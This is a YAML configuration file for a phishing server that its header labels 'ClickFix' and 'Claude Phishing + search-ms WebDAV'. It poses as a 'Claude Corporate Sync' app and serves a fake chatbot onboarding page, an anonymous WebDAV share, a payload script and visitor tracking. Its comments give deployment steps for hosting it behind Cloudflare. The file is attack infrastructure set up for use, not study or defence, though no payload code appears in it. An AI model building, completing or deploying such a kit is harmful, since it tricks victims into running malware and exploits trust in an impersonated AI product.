# =============================================
# ClickFix Server Configuration
# Claude Phishing + search-ms WebDAV
# =============================================

app:
  name: "Claude Corporate Sync"
  version: "2.1.0"
  debug: false

# ====================== Server ======================
server:
  host: "0.0.0.0"
  port: 443                     # Use 80 for HTTP, 443 for HTTPS
  ssl: false                   # Set true for HTTPS
  cert_file: "cert.pem"        # SSL cert path (for self-signed or Let's Encrypt)
  key_file: "key.pem"         # SSL key path

# Cloudflare SSL Modes:
# - Flexible: Cloudflare auto HTTP, server can be HTTP
# - Full: Cloudflare HTTPS, server needs valid cert (self-signed OK)
# - Full (Strict): Cloudflare HTTPS, server needs valid cert (Let's Encrypt recommended)
cloudflare:
  enabled: true              # Set true when behind Cloudflare
  ssl_mode: "flexible"        # flexible / full / full_strict

# ====================== WebDAV Configuration ======================
webdav:
  enabled: true
  mount_path: "/dav"           # URL: https://domain.com/dav
  root_folder: "dav"           # dav/ folder
  anonymous: true
  verbose: 1

# ====================== Template ======================
template: "chatbot_onboarding.html"
modal_template: "old_onboard_template.html"

# ====================== Payload ======================
payload:
  enabled: true
  default_script: "payload.txt"

tracking:
  enabled: true

# =============================================
# Deployment Guide:
# 
# LOCAL (no Cloudflare):
#   - port: 80
#   - cloudflare.enabled: false
#   - Access: http://localhost/claude
#
# VPS with Cloudflare:
#   - port: 443
#   - cloudflare.enabled: true
#   - Cloudflare auto-proxies HTTPS
#   - No SSL cert needed on server
#
# VPS Standalone (no Cloudflare):
#   - port: 443
#   - ssl: true
#   - cert_file: "/path/to/cert.pem"
#   - key_file: "/path/to/key.pem"
# =============================================
